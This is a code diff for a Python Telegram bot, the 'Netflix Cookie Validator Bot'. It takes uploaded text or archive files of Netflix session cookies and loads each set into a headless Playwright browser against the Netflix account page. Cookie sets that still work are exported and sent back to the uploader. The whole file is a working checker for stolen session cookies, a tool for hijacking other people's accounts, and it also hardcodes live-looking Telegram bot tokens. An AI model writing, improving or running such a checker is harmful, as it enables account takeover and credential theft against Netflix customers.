@@ -8,7 +8,6 @@ import logging
 import multiprocessing
 import time
 from concurrent.futures import ProcessPoolExecutor
-from functools import partial
 from pyunpack import Archive
 from telegram import Update, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -19,7 +18,7 @@ from playwright.async_api import async_playwright
 
 # ========== Configuration ==========
 WORKERS = 5  # Change this to adjust worker count
-BOT_TOKEN = "8340045274:AAHLEaAExw9cy5ot8FqVfGFwIpGwoXxjLQg"
+BOT_TOKEN = "8430924374:AAExcNeaQuyuaSoryMNEraUL0W_P1cG4aSA"
 TARGET_URL = "https://www.netflix.com/account"
 
 # ========== Logging ==========
@@ -89,36 +88,52 @@ def next_export_filename(base="working", ext=".txt"):
     next_num = max(nums, default=0) + 1
     return f"{base}{next_num}{ext}"
 
-def parse_specific_cookie(file_path, target_cookie="NetflixId"):
+def parse_cookie(cookie_str: str):
     """
-    Read a cookie file and extract ALL NetflixId lines.
-    Each line should be like:
-    NetflixId=abcdef123456789
+    Accept either:
+      1) A single-line Cookie header string e.g. "a=1; b=2"
+      2) A JSON array in the 'EditThisCookie'-like style
+    Returns a dict {name: value}
+    """
+    cookie_str = cookie_str.strip()
+    # Try JSON first
+    if cookie_str.startswith('[') or cookie_str.startswith('{'):
+        try:
+            data = json.loads(cookie_str)
+            if isinstance(data, dict):
+                data = [data]
+            if isinstance(data, list):
+                out = {}
+                for item in data:
+                    if isinstance(item, dict) and 'name' in item and 'value' in item:
+                        out[str(item['name'])] = str(item['value'])
+                if out:
+                    return out
+        except Exception:
+            pass
+    # Fallback to header format (a=1; b=2)
+    out = {}
+    for part in cookie_str.split(';'):
+        if '=' in part:
+            name, value = part.split('=', 1)
+            out[name.strip()] = value.strip()
+    return out if out else None
+
+def _cookie_dict_to_playwright(cookie_dict):
+    """
+    Convert {name:value} dict to Playwright cookie format.
     """
     cookies = []
-    try:
-        with open(file_path, "r", encoding="utf-8") as f:
-            for line in f:
-                line = line.strip()
-                if not line or line.startswith("#"):
-                    continue  # skip comments/blank lines
-
-                if "=" in line:
-                    name, value = line.split("=", 1)
-                    if name.strip() == target_cookie:
-                        cookies.append([{
-                            "name": target_cookie,
-                            "value": value.strip(),
-                            "domain": "example.com",   # replace with Netflix domain if you want
-                            "path": "/",
-                            "secure": True,
-                            "httpOnly": False,
-                            "sameSite": "Lax"
-                        }])
-        return cookies if cookies else None
-    except Exception as e:
-        logger.error(f"Failed to parse specific cookie: {e}")
-        return None
+    for name, value in cookie_dict.items():
+        cookies.append({
+            "name": name,
+            "value": value,
+            "domain": ".netflix.com",
+            "path": "/",
+            "secure": True,
+            "httpOnly": False
+        })
+    return cookies
 
 def create_status_keyboard(valid_count=0, invalid_count=0):
     """Create inline keyboard with status buttons"""
@@ -129,6 +144,8 @@ def create_status_keyboard(valid_count=0, invalid_count=0):
         ]
     ]
     return InlineKeyboardMarkup(keyboard)
+
+# ========== Progress Updater ==========
 
 async def update_progress_message(context, force_update=False):
     """Update the progress message with current status"""
@@ -195,28 +212,33 @@ def process_cookie_file_worker(input_path):
     from playwright.async_api import async_playwright
 
     async def _process():
+        cookie_dicts = []
         try:
-            all_cookie_sets = parse_specific_cookie(input_path, target_cookie="NetflixId")
-            if not all_cookie_sets:
-                logger.error(f"[Worker {os.getpid()}] No NetflixId cookies found in file")
-                return None
+            with open(input_path, "r", encoding="utf-8") as f:
+                for line in f:
+                    parsed = parse_cookie(line)
+                    if parsed:
+                        cookie_dicts.append(parsed)
         except Exception as e:
-            logger.error(f"[Worker {os.getpid()}] Failed to read file: {e}")
+            logger.error(f"[Worker {os.getpid()}] Failed to read cookie file: {e}")
+            return None
+
+        if not cookie_dicts:
+            logger.error(f"[Worker {os.getpid()}] No valid cookies found in file")
             return None
 
         export_paths = []
 
         async with async_playwright() as p:
-            for cookie_set in all_cookie_sets:
+            for cookie_dict in cookie_dicts:
                 browser = await p.chromium.launch(headless=True)
                 context = await browser.new_context()
 
                 try:
-                    await context.add_cookies(cookie_set)
+                    await context.add_cookies(_cookie_dict_to_playwright(cookie_dict))
                 except Exception as e:
                     logger.warning(f"[Worker {os.getpid()}] Cookie inject failed: {e}")
                     await browser.close()
-                    progress.increment_processed(is_valid=False)
                     continue
 
                 page = await context.new_page()
@@ -230,16 +252,11 @@ def process_cookie_file_worker(input_path):
                         with open(export_path, "w", encoding="utf-8") as f:
                             json.dump(new_cookies, f, separators=(",", ":"))
                         export_paths.append(export_path)
-                        progress.increment_processed(is_valid=True)
                         logger.info(f"[Worker {os.getpid()}] Exported cookies to {export_path}")
-                    else:
-                        progress.increment_processed(is_valid=False)
                 else:
                     logger.warning(f"[Worker {os.getpid()}] ❌ Invalid NetflixId")
-                    progress.increment_processed(is_valid=False)
 
                 await browser.close()
-                # live update after each NetflixId line
 
         return export_paths if export_paths else None
 
@@ -278,13 +295,13 @@ class WorkerPool:
                 file_path
             )
             return result
-
         except Exception as e:
             logger.error(f"Worker process failed: {e}")
             return None
         finally:
             self.active_tasks -= 1
             logger.info(f"Task completed. Active tasks: {self.active_tasks}/{self.max_workers}")
+
 
 # Global worker pool instance
 worker_pool = WorkerPool(max_workers=WORKERS)
@@ -296,8 +313,15 @@ async def process_cookie_file(input_path, context):
     """Main interface for processing cookie files using worker pool with concurrency control"""
     async with semaphore:
         result = await worker_pool.process_file(input_path)
-        return result  # just return list of export files
 
+        # Update progress here (in main process)
+        if result:
+            progress.increment_processed(is_valid=True)
+        else:
+            progress.increment_processed(is_valid=False)
+
+        await update_progress_message(context)
+        return result
 
 
 async def send_result(update, exported_path, filename=None):
@@ -324,27 +348,21 @@ async def send_result(update, exported_path, filename=None):
     else:
         return False
 
-# ========== Parallel Processing Functions ==========
 
+# ========== Parallel Processing Functions ==========
 async def process_files_in_parallel(txt_files, update, context):
     """Process multiple files in parallel using all available workers"""
     total_files = len(txt_files)
     progress.set_total(total_files)
     progress.chat_id = update.effective_chat.id
     
-# Do not create another status message here.
-# Progress message will be created inside process_files_in_parallel or process_files_in_batches
-
-    
-    if total_files == 1:
-        # Single file - just process it
-        full_path, filename = txt_files[0]
-        exported_path = await process_cookie_file(full_path, context)
-        await send_result(update, exported_path, filename)
-        return progress.valid_files
-    
-    # Multiple files - process in parallel
-    await update_progress_message(context)
+    # Send initial progress message
+    status_msg = await update.message.reply_text(
+        "🚀 **Starting Processing...**\n\n📁 Initializing workers...",
+        parse_mode='Markdown',
+        reply_markup=create_status_keyboard(0, 0)
+    )
+    progress.status_message_id = status_msg.message_id
     
     # Create tasks for all files
     tasks = []
@@ -364,12 +382,14 @@ async def process_files_in_parallel(txt_files, update, context):
         if isinstance(result, Exception):
             logger.error(f"Failed to process {filename}: {result}")
         elif result:
-            await send_result(update, result, filename)
+            for exported_path in result:  # result is list of JSON files
+                await send_result(update, exported_path, filename)
     
     # Final status update
     await update_progress_message(context, force_update=True)
     
     return progress.valid_files
+
 
 async def process_files_in_batches(txt_files, update, context, batch_size=None):
     """Process files in batches for better progress tracking with large archives"""
@@ -410,30 +430,33 @@ async def process_files_in_batches(txt_files, update, context, batch_size=None):
                 logger.error(f"Failed to process {filename}: {result}")
                 progress.increment_processed(is_valid=False)
             elif result:
-                await send_result(update, result, filename)
+                for exported_path in result:
+                    await send_result(update, exported_path, filename)
                 progress.increment_processed(is_valid=True)
             else:
                 progress.increment_processed(is_valid=False)
 
             # 🔧 Update progress after each file
             await update_progress_message(context)
-
-
     
     # Final status update
     await update_progress_message(context, force_update=True)
     
     return progress.valid_files
 
+
 # ========== Bot Commands ==========
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_text = (
         "🎬 **Netflix Cookie Validator Bot**\n\n"
-        "👋 Send me a `.txt`, `.zip`, or `.rar` cookie file and I'll validate each one for you.\n\n"
-        "🚀 **Ready to process your cookies!**"
+        "👋 Send me a `.txt`, `.zip`, or `.rar` cookie file and I'll validate each NetflixId for you.\n\n"
+        f"⚡ Parallel Workers: {WORKERS}\n"
+        "📊 Real-time progress tracking\n"
+        "🚀 Ready to process your cookies!"
     )
     await update.message.reply_text(welcome_text, parse_mode='Markdown')
+
 
 async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
@@ -445,6 +468,7 @@ async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"• Parallel Processing: Enabled",
         parse_mode='Markdown'
     )
+
 
 async def workers_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Command to show current worker configuration"""
@@ -459,15 +483,17 @@ async def workers_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(info_text, parse_mode='Markdown')
 
+
 async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle inline keyboard button presses"""
     query = update.callback_query
     await query.answer()
     
     if query.data == "valid_status":
-        await query.answer("✅ Valid cookies will be sent to you automatically!")
+        await query.answer("✅ Valid cookies will be sent automatically.")
     elif query.data == "invalid_status":
-        await query.answer("❌ Invalid cookies are discarded automatically!")
+        await query.answer("❌ Invalid cookies are discarded.")
+
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
@@ -513,13 +539,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     temp_f.write(line + "\n")
                 temp_files.append((temp_name, f"{document.file_name}_line{i}"))
 
-        # Progress setup
-        progress.set_total(len(temp_files))
-        progress.chat_id = update.effective_chat.id
-
-# Do not create a status message here
-# Progress message will be created inside process_files_in_parallel or process_files_in_batches
-
         # Run in parallel with workers
         if len(temp_files) <= 10:
             processed = await process_files_in_parallel(temp_files, update, context)
@@ -541,7 +560,6 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
             os.remove(fpath)
         os.remove(downloaded_name)
 
-        
     else:
         extract_msg = await update.message.reply_text("📦 **Extracting archive...**", parse_mode='Markdown')
         extract_dir = f"extracted_{unique_id}"
@@ -599,14 +617,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         shutil.rmtree(extract_dir)
         os.remove(downloaded_name)
 
+
 # ========== Application Shutdown Handler ==========
 async def shutdown_handler(app):
     """Gracefully shutdown worker pool"""
     logger.info("Shutting down worker pool...")
     worker_pool.stop()
 
-# ========== Run Bot ==========
 
+# ========== Run Bot ==========
 async def post_init(app):
     await app.bot.delete_webhook(drop_pending_updates=True)
     me = await app.bot.get_me()
@@ -616,8 +635,8 @@ async def post_init(app):
     # Start worker pool
     worker_pool.start()
 
+
 if __name__ == "__main__":
-    # Set multiprocessing start method for compatibility
     multiprocessing.set_start_method('spawn', force=True)
     
     app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
@@ -635,7 +654,4 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         logger.info("Bot stopped by user")
     finally:
-        # Cleanup worker pool
         worker_pool.stop()
-
-
